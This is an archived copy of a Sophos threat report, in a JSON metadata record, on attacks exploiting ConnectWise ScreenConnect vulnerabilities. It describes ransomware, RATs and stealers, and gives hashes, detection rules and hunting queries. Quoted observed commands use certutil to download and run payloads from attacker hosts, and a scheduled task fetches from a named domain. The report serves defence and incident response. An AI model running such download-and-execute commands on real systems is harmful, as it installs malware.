{
    "id": "dd2e3133-9bb9-4c38-9c78-50e893abfbe8",
    "created_at": "2024-03-14T02:06:32.049608Z",
    "updated_at": "2025-03-27T02:05:24.362675Z",
    "deleted_at": null,
    "sha1_hash": "109638002e0eabb128fc553f32cd7300ddf32148",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-03-13T09:47:48Z",
    "file_modification_date": "2024-03-13T09:47:48Z",
    "file_size": 768330,
    "plain_text": "# ConnectWise ScreenConnect attacks deliver malware\n\n**[news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware](https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/)**\n\nFebruary 23, 2024\n\nSophos X-Ops is tracking a developing wave of vulnerability exploitation targeting\nunpatched ConnectWise ScreenConnect installations. This page provides advice and\nguidance for customers, researchers, investigators and incident responders. This\ninformation is based on observation and analysis of attacks by SophosLabs, Sophos\nManaged Detection and Response (MDR) and Sophos Incident Response (IR), in which\nthe ScreenConnect client or server was involved.\n\nWe will update this page as events and understanding develop, including our threat and\ndetection guidance.\n\n17:45 UTC, 2024-03-01 Update: Information on three new attacks attempting to more\ndeeper into a customer network after exploiting a vulnerability in ScreenConnect server\n(“Further attempts,” below).\n\n19:30 UTC, 2024-02-23 Update: In collaboration with ConnectWise, we have updated the\nSituation Overview section, below, to clarify circumstances surrounding the incident and\nongoing attacks.\n\n## Situation Overview\n\nOn February 19, 2024, ConnectWise released a security advisory for its remote\n[monitoring and management (RMM) software. Their advisory highlighted two](https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8)\nvulnerabilities that impact older versions of ScreenConnect and have been mitigated in\n**version 23.9.8 and later.**\n\nConnectWise states in the advisory these vulnerabilities are rated as “Critical—\n**Vulnerabilities that could allow the ability to execute remote code or directly impact**\n**confidential data or critical systems”. The two vulnerabilities are:**\n\nThe vulnerabilities involves authentication bypass and path traversal issues within the\nserver software itself, not the client software that is installed on the end-user devices.\nAttackers have found that they can deploy malware to servers or to workstations with the\nclient software installed. Sophos has evidence that attacks against both servers and client\nmachines are currently underway. Patching the server will not remove any malware or\nwebshells attackers manage to deploy prior to patching and any compromised\nenvironments need to be investigated.\n\nCloud-hosted implementations of ScreenConnect, including screenconnect.com and\nhostedrmm.com, received mitigations with hours of validation to address these\nvulnerabilities. Self-hosted (on-premise) instances remain at risk until they are manually\n\n\n-----\n\nupgraded, and it is our recommendation to patch to ScreenConnect version 23.9.8\n[immediately. The upgrade is available on ScreenConnect’s download page.](https://screenconnect.connectwise.com/download)\n\n[[update] If you are no longer under maintenance, ConnectWise is allowing you to install](https://screenconnect.connectwise.com/download)\n[version 22.4 at no additional cost, which will fix CVE-2024-1709, the critical vulnerability.](https://screenconnect.connectwise.com/download)\nHowever, this should be treated as an interim step. ConnectWise recommends updating\nto the latest release to get all the current security patches and therefore all partners\nshould upgrade to 23.9.8 or higher using the upgrade path outlined above.\n\nOn February 21, 2024, proof of concept (PoC) code was released on GitHub that exploits\nthese vulnerabilities and adds a new user to the compromised system. ConnectWise has\nalso updated their initial report to include observed, active exploitation in the wild of these\nvulnerabilities.\n\n[On February 22, 2024, Sophos X-Ops reported through our social media handle that](https://infosec.exchange/@SophosXOps/111975043941611370)\n[despite the recent law enforcement activity against the LockBit threat actor group we had](https://infosec.exchange/@SophosXOps/111968364127443623)\nobserved several attacks over the preceding 24 hours that appeared to be carried out\nwith LockBit ransomware, built using a leaked malware builder tool. It appears that our\nsignature-based detection correctly identified the payloads as ransomware generated by\nthe leaked LockBit builder, but the ransom notes dropped by those payloads identified\none as “buhtiRansom,” and the other did not have a name in its ransom note.\n\nThis article includes additional details and analysis of the ScreenConnect attacks Sophos\nobserved in the past 48 hours.\n\n## Recommendations\n\nConfirm whether you have an on-premises deployment of ScreenConnect Server\n\nIf you have an on-premises instance in your environment running a version\nprior to 23.9.8, take it offline immediately until you upgrade to the newest\nversion; isolate or shut it down until it is patched and investigated for signs of\nexploitation.\nIf you have an on-premises version in your environment that was updated to\nversion 23.9.8 or later prior to February 21, you are not at risk, though it would\nbe prudent to inspect the server to ensure no malicious payloads were\ninstalled.\nIf you use the cloud-hosted version, you are not at risk and no further actions\nare necessary.\nIf your deployment of ScreenConnect Server is hosted by a third-party vendor,\nconfirm with them they have upgraded their instance to 23.9.8 or later; if they have\nnot, recommend that they take it offline until the patches are applied.\nScan your environment and customer environments for instances of ScreenConnect\nthat you may not be aware of, to avoid the risk of those ScreenConnect being\nunpatched and exposing the environment to a Supply Chain Attack.\n\n\n-----\n\nIf you have ScreenConnect clients and are unsure of/unable to determine the patch\nstatus of all servers that may connect to it, you should presume these servers are\nvulnerable until you can verify otherwise.\nYou can protect ScreenConnect clients from vulnerable servers by implementing\nSophos Application Control Policy to block ScreenConnect until the servers can be\n[verified to be patched. More details on Application Control can be found on our site.](https://docs.sophos.com/central/customer/help/en-us/ManageYourProducts/EndpointProtection/ConfigureAppControl/index.html)\nOnce patching has been completed, perform a thorough review of the\nScreenConnect installation looking for unknown accounts and abnormal server\nactivity.\n\nReview the users.xml for signs of new accounts or modifications.\nAssume that any machines hosting a ScreenConnect server could have one\nor more implanted web shells (or other remote access tools not installed by\nyour IT team) that need to be found and removed.\nInspect your estate for newly added user IDs or accounts and remove or\nfreeze access to them until they are known to be legitimate.\nIn an on-premises installation, check the location where any ScreenConnect\nExtensions are located for webshells or other payloads (files with .ps1, .bat or\n.cmd file suffixes).\nDeploy endpoint security to any server currently or formerly used to run\nScreenConnect.\nXG Firewall customers will soon be able to enable new IDS signatures designed to\ndetect malicious activity related to ScreenConnect exploits.\nIf you know how to use penetration-testing tools like the Metasploit Framework,\nthere is already a Metasploit module you can use to test whether your devices are\nvulnerable. There are several other proofs-of-concept in the wild, as well.\n\n## Attacks involving ScreenConnect\n\nSince the news broke this week about the vulnerability in ScreenConnect, Sophos\nanalysts have been closely monitoring telemetry systems looking for any anomalous or\nmalicious behavior in which the ScreenConnect client or server software was either the\nroot cause or was part of the attack chain in some way. The teams then sifted through this\nnoisy log data to isolate and document specific malicious activity.\n\nBefore this vulnerability had become widely known, there had been a moderate number\nof daily telemetry entries in which threat actors attempted to deploy malware or run a\nmalicious command on a customer machine running ScreenConnect. However, since\nFebruary 21, the daily volume of telemetry events involving ScreenConnect has more\nthan doubled.\n\n\n-----\n\n_Figure 1: A 90-day summary of hits with a ScreenConnect parent process on machines;_\n_note the spike in the last few days_\n\nMany companies and managed service providers use ScreenConnect, and not all\nbehavior we observed came as a direct result of the vulnerability being exploited, but\nSophos believes a significant number of the current wave of telemetry events were\ncaptured as a direct result of the increased threat actor attention to ScreenConnect.\n\nThreat actors have been leveraging the exploits against ScreenConnect to launch a wide\nvariety of attacks and deliver a range of different types of malware to target machines.\nWhat follows is a brief summary of some of the incidents we are currently tracking.\n\n### LockBit ransomware, built with a leaked malware compiler\n\nAt least one threat actor is abusing ScreenConnect to deploy a ransomware executable.\nSophos suspects it is the same person or group; an identical payload (SHA-256\n2da975fee507060baa1042fb45e8467579abf3f348f1fd37b86bb742db63438a) was\ndiscovered in more than 30 different customer networks, beginning on February 22. This\ndistribution pattern is strongly indicative of the threat actor pushing the payload from a\ncompromised server.\n\nThe executable in question was built using the LockBit 3 ransomware builder tool leaked\nin 2022, so this particular sample may not have originated with the actual LockBit\ndevelopers. Our detection for this generation of LockBit (Troj/Ransom-GYT) was built\nspecifically to detect samples generated by the leaked builder tool before they run. We’ve\nalso seen a memory detection rule (Mem/LockBit-B) stopping the execution of both the\noriginal and the copycat builds of LockBit in some cases.\n\nHowever, the ransomware did not call itself LockBit.\n\n\n-----\n\n_Figure 2: The ransom note dropped by this malware self-identifies as “buhtiRansom”_\n\n_Figure 3: This root-cause analysis (RCA) graph highlights malicious activity during the_\n_attacks involving the “buhtiRansom” LockBit variant_\n\n\n-----\n\nThe attackers deploying this ransomware executable have consistently used the filename\nof “enc.exe” or “upd.exe” in the following locations\n```\n<d>\\Windows\\Temp\\ScreenConnect\\23.9.6.8787\\upd.exe\n<d>\\Windows\\Temp\\ScreenConnect\\23.9.6.8787\\enc.exe\n<d>\\users\\[username]\\temp\\enc.exe\n\n```\nThe “buhtiRansom” LockBit variant was not the only ransomware we spotted in the wild.\n\nWe also saw a different attacker attempt to drop another payload\n[(a50d9954c0a50e5804065a8165b18571048160200249766bfa2f75d03c8cb6d0) using](https://www.virustotal.com/gui/file/a50d9954c0a50e5804065a8165b18571048160200249766bfa2f75d03c8cb6d0/detection)\nthe certutil utility to download it from a web address, write it to the root of the C:\\ drive\nwith the filename svchost.exe, and execute it. In this case, the behavioral rule Lateral_1b\nblocked the file from being downloaded and the attack failed.\n```\n<d>\\Program Files (x86)\\ScreenConnect Client\n(60ccb130004e2bbf)\\ScreenConnect.ClientService.exe -> certutil.exe -urlcache -f\nhttp://<ip-address>/svchost.exe c:\\svchost.exe\n\n```\nWhile it failed to deploy on the customer environment, when we ran it on a sandbox, it\ndropped a ransom note that looks like this:\n\n_Figure 4: The ransom note we observed in a sandboxed environment_\n\nThe malware also changed the desktop background to this:\n\n\n-----\n\n_Figure 5: The desktop background we observed_\n\nSo at least this sample self-identifies as a variant based on the Lockbit builder code.\n\n### AsyncRAT attacks\n\nThe Labs team who manage our CryptoGuard and HitmanPro tools noticed a burst of\ndetections downstream of ScreenConnect. Digging in, we can see these attacks, in which\na malicious process is triggering our HollowProcess detection against PowerShell, intend\nto deliver AsyncRAT as a payload.\n\n### Password stealers\n\nTelemetry indicates attackers are also pushing the Vidar/Redline data stealer malware\n(SHA-256 c94038781c56ab85d2f110db4f45b86ccf269e77a3ff4b9133b96745ff97d25f) via\nScreenConnect. The HMPA CookieGuard and TTP classifications (T1555.003) trigger on\nthis type of attack. The attack looks like the ScreenConnect.WindowsClient.exe launches\nthe malware from this location:\n```\n<d>\\Users\\<username>\\Documents\\ConnectWiseControl\\Temp\\UpdaterScreenConnect.exe\n\n## SimpleHelp remote access client, followed by ransomware\n\n```\nOne threat actor abused ScreenConnect to push another remote access client to the\ntarget machine. In this example, the attacker used ScreenConnect.WindowsClient.exe to\nlaunch the SimpleHelp installer (named first.exe) from this location:\n```\n<d>\\Windows\\Temp\\ScreenConnect\\20.13.1905.7657\\Files\\first.exe\n\n```\nFive hours later, on the same machine, we observed ransom notes appear on the system\nand files renamed with a different file extension. The ransomware had been installed\nusing the msiexec.exe utility. The process tree for this event looked like this:\n\n\n-----\n\n```\nservices.exe ->\nmsiexec.exe ->\n<d>\\Windows\\TEMP\\MW-5f3810bb-bac1-4cc4-a1a3-7e04046d7ea4\\files\\crypt64ult.exe\n\n```\n_Figure 6: A root-cause analysis (RCA) diagram shows services.exe launching_\n_msiexec.exe, which in turn launches the ransomware crypt64ult.exe, which changes a_\n_file’s file extension to .CRYPT_\n\nA few minutes later, the attackers use ScreenConnect to run a command that downloads\nanother malware payload to this machine, using the Windows certutil utility, then runs it.\n```\nScreenConnect.ClientService.exe ->\ncmd.exe /c c:\\windows\\temp\\ScreenConnect\\20.13.1905\\7657\\<guid>run.cmd ->\ncertutil -urlcache -f http://<ip>:8084/msappdata.msi c:\\mpyutd.msi\n\n```\n\n-----\n\n### Rust infostealer\n\n_Figure 7: The Rust infostealer attack tree_\n\nAttackers use the ScreenConnect client utility to run a batch script they’ve downloaded\ninto the folder belonging to another remote access tool. The batch script downloads a\npayload, written in Rust, from an AWS storage server. The payload, when it runs, injects\nitself into Explorer.exe then deletes itself from the filesystem.\n\nAnalysts have not studied the payload, but several other vendors classify it as malware\ncalled Redcap, which is used to steal and exfiltrate information from servers.\n\n### Cobalt Strike payloads\n\nOn February 22, three unrelated companies (two in North America, one in Europe) were\nhit with a remarkably similar attack that delivered a Cobalt Strike beacon to a machine in\nthe network with the ScreenConnect client installed. The telemetry indicated that in all\nthree cases, the Cobalt Strike payload was caught and prevented from running by a\nbehavioral rule called AMSI/Cobalt-A.\n\nThe ScreenConnect client received a file with a .cmd extension in the temporary directory\nwhere it stores downloaded files, then executed it. The .cmd tried to launch PowerShell to\nuse it to download the beacon, but was stopped by the endpoint rule. Subsequent\nanalysis revealed that the payload was retrieved from the same C2 server in all three\ncases.\n\n### Xworm payload attempted delivery to home user\n\nOne machine that was running the ScreenConnect client software was attacked with\nmalware called Xworm. The exploit caused the client to write a file into the %temp%\ndirectory and then triggered the client to run it. The file contained a one-line PowerShell\n\n\n-----\n\ncommand that downloaded a 531KB file from a public Pastebin-type server. The file was,\nitself, a script that contained a massive data blob and a small amount of script code to\n[transform the data into a Windows executable.](https://www.virustotal.com/gui/file/f1c7045badec0b9771da4a0f067eac99587d235d1ede35190080cd051d923da6)\n\n_Figure 8: An excerpt from the payload_\n\nOnce decoded, the malware uses a variety of persistence methods and can spread to\nother machines by copying itself to USB storage media. It is also a full-featured RAT and\nadds an exclusion for itself to Windows Defender. However, the endpoint protection on\nthe customer’s machine prevented it from being infected. The signatures Troj/RAT-FJ and\nTroj/PSDrop-IU effectively neutralized the threat before it could cause harm.\n\n### Further attempts\n\nWe’ve seen three more incidents of attackers attempting to move deeper into customer\nnetworks after exploiting a vulnerability in ScreenConnect server. In one, the attacker\nattempted to do reconnaissance on the ScreenConnect server, using PowerShell to try to\nrun getlocaluser (to obtain a list of local user accounts on the server) and ipconfig (to get\nthe local network interface information).\n\nThe actor behind the other incidents was much more persistent. In one of their attempts,\nthey first attempted to disable Sophos endpoint protection. Then they attempted to install\na Cloudflare Tunnel client to be used as a backdoor, downloading it from Cloudflare’s\nGitHub page.\n\nThey also ran a number of PowerShell commands in an attempt to carry out\nreconnaissance and establish persistence on the compromised server:\n\nrunning pwd (to get the current directory);\nipconfig;\nwhoami (to get the account name associated with the Screen Connect process);\n\n\n-----\n\ntasklist (to view running processes on the server);\nget-localuser;\nget-netfirewallprofile (to view the active Windows Firewall configuration);\nping 1.1.1.1 (a check to see if the server could reach Cloudflare’s DNS service)\n\nThe attacker also attempted to make edits to the server’s Windows Registry to enable\nRemote Desktop Protocol access, and created a persistent task named “Windows\nupdate” that attempted to download a payload from sc.ksfe.workers[.]dev. And they\ndeployed the Empire post-exploitation framework in an attempt to further establish\npersistence and obtain credentials. The same Empire payload, loaded from the same\nremote server, was used in a third attempted attack we detected. All of this activity was\nblocked by Sophos endpoint security.\n\n## Safe Mode RAT deploys its own ScreenConnect for persistence\n\nIn an attack against the ScreenConnect server instances, a threat actor is pushing an\n[executable named patch3.exe to vulnerable servers. The patch3 executable is a RAT with](https://www.virustotal.com/gui/file/88b733199d8d34045136587bd1d911322792ca00d1dd2d8b6b9af080ec393f00)\nsome interesting behaviors; It apparently adds entries into the registry so that it will start\nup even if the computer is booted into Safe Mode. It also downloads an .msi installer.\n\n_Figure 9: Part of an observed attack by the Safe Mode RAT_\n\nMDR analysts looking more closely into this sample determined that the threat actor was\ninstalling a new instance of the ScreenConnect client on the infected device, then using\ntheir (the attackers’) own ScreenConnect client to talk to (and remotely manage) the\ntarget’s ScreenConnect server. The infected device later launched various PowerShell\ncommands. Irony isn’t dead.\n\n## Threat hunting information\n\nThe simplicity of exploiting these vulnerabilities makes it imperative for organizations to\nassess their exposure and take decisive steps to mitigate risks. The following points offer\na high-level guide to investigate your environment:\n\n\n-----\n\n1. Identification of ScreenConnect installations: The first step involves locating all\n\ninstances of ScreenConnect within your organization’s network. Remember, some\nof these installations might be managed by external service providers, so\nthoroughness is key. The server component is ultimately what needs patched, but\nknowing the scope of client installations will help assess exposure\n2. Isolation and removal: Temporarily isolate or uninstall the ScreenConnect Client\n\nsoftware from identified devices. This measure is critical until you can confirm that\nthe server has been updated with the necessary security patches or until a\ncomprehensive analysis is conducted. If you don’t manage the ScreenConnect\nServer for your environment, uninstallation may be the fastest route to mitigate the\nrisk\n3. Conduct detailed analysis: On devices with ScreenConnect client software,\n\nperform an in-depth investigation. Focus on:\n\n**Creation of new local users: Check for any unauthorized new user accounts**\nwhich were created.\n**Suspicious client software activity: Monitor for unusual commands**\nexecuted by the ScreenConnect client\n**System and domain reconnaissance activities: Look for commands that**\nindicate scanning or probing of your systems.\n**Disabling of security controls: Look for any actions that attempt to**\ndeactivate security measures, such as anti-virus software and local firewall\npolicies.\n4. Initiate Incident Response if needed: If your analysis uncovers any suspicious\n\nactivities, promptly activate your incident response plan. This step is crucial to\nunderstand the scope of the potential incident and to implement remediation\nstrategies\n\n[Sophos X-Ops Incident Response has built a series of XDR queries for customers to use](https://github.com/SophosRapidResponse/OSQuery/tree/main/Vulnerabilities/ScreenConnect)\nfor threat hunting in their environment. These queries include the following:\n\n[Check version of ScreenConnect Server – Identifies machines running](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.01.0%20-%20Check%20version%20of%20ScreenConnect%20Server.sql)\nScreenConnect Server vulnerable to Authentication Bypass (CVE-2024-1709 &\nCVE-2024-1708)\n[Check version of ScreenConnect Server.sql (datalake) – Identifies machines](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.01.1%20-%20Check%20version%20of%20ScreenConnect%20Server.sql)\nrunning ScreenConnect Server vulnerable to Authentication Bypass (CVE-20241709 & CVE-2024-1708)\n[ScreenConnect Relay IP – Identify the IP addresses that the ScreenConnect](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.02.0%20-%20ScreenConnect%20Relay%20IP.sql)\napplication running on machines is connecting to. these IP addresses can be\nutilized in external tools like Shodan.io and Censys.io to assess if the\nScreenConnect server corresponding to these endpoints is vulnerable to CVE2024-1709 and CVE-2024-1708\n[SetupWizard.aspx in IIS logs – Look for the trailing slash after SetupWizard.aspx in](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.03.0%20-%20SetupWizard.aspx%20in%20IIS%20logs.sql)\nthe IIS logs, which can be an indicator of possible exploitation of Screenconnect\nauth bypass\n\n\n-----\n\n[Check user.xml file for new users created – Check the User.xml file found in the](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.04.0%20-%20Checks%20user.xml%20file%20for%20new%20users%20created.sql)\nScreenConnect\\App_Data folder for possible signs of exploitation in the\nScreenConnect Server. The content of the file will be updated when an attacker\nexecutes the exploit and creates a new user\n[Evidence of temporary User File creation – Check for temporary user creation XML](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.05.0%20-%20Evidence%20of%20temporary%20User%20File%20creation.sql)\nfiles on disk within a time range. This file can be an indicator for possible\nexploitation of CVE-2024-1709.\n[Check for .ASPX .ASHX files in App_Extensions folder – Detect potential](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.06.0%20-%20Check%20for%20.ASPX%20.ASHX%20files%20in%20App_Extensions%20folder.sql)\nexploitation of CVE-2024-1708 on a machine hosting a ScreenConnect server by\nlooking for .ASPX and .ASHX files written in the \\ScreenConnect\\App_Extensions\nfolder\n[Identify shells being spawned from ScreenConnect – Identify shells being spawned](https://github.com/SophosRapidResponse/OSQuery/blob/main/Vulnerabilities/ScreenConnect/ScreenConnect.07.0%20-%20Identify%20shells%20being%20spawned%20from%20ScreenConnect.sql)\nfrom ScreenConnect process.\n\n## Detection and protection\n\nThe following detection rules were previously implemented to identify abuse of\nScreenConnect and are still viable for identifying post-exploitation activity.\n\nWIN-EXE-PRC-SCREENCONNECT-COMMAND-EXECUTION-1\nWIN-EXE-PRC-SCREENCONNECT-REMOTE-FILE-EXECUTION-1\nWIN-EXE-PRC-SCREENCONNECT-RUNFILE-EXECUTION-1\n\nWe have multiple protections within InterceptX to block post-exploitation activity. We’ve\nalso released the following detection for publicly available exploit scripts seen targeting\nCVE-2024-1709 (CWE-288) — Authentication Bypass Using Alternate Path or Channel:\n\nATK/SCBypass-A\n\n### Protections for SFOS and EPIPS:\n\n**SID** **Name**\n\n2309339 Connectwise Screenconnect Authentication Bypass Vulnerability\n\n2309343 Connectwise Screenconnect Authentication Bypass Vulnerability\n\n2309344 Connectwise Screenconnect Authentication Bypass Vulnerability\n\n## Acknowledgments\n\nAnthony Bradshaw, Paul Jaramillo, Jordon Olness, Benjamin Sollman and Dakota\nMercer-Szady from MDR\n\nAnand Ajjan, Fraser Howard, Rajesh Nataraj, Gabor Szappanos, and Ronny Tijink from\nSophosLabs\n\n\n-----\n\nPeter Mackenzie, Elida Leite and Lee Kirkpatrick from Incident Response\n\n[Indicators of compromise relating to these attacks have been published to the](https://github.com/sophoslabs/IoCs/blob/master/2024-02_Payloads_associated_with_ScreenConnect_attacks.csv)\nSophosLabs Github.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2024/2024.02.23.ConnectWise_Malware/ConnectWise%20ScreenConnect%20attacks%20deliver%20malware%20%E2%80%93%20Sophos%20News.pdf"
    ],
    "report_names": [
        "ConnectWise ScreenConnect attacks deliver malware – Sophos News"
    ],
    "threat_actors": [],
    "ts_created_at": 1710381992,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1710323268,
    "ts_modification_date": 1710323268,
    "files": {
        "pdf": "https://archive.orkl.eu/109638002e0eabb128fc553f32cd7300ddf32148.pdf",
        "text": "https://archive.orkl.eu/109638002e0eabb128fc553f32cd7300ddf32148.txt",
        "img": "https://archive.orkl.eu/109638002e0eabb128fc553f32cd7300ddf32148.jpg"
    }
}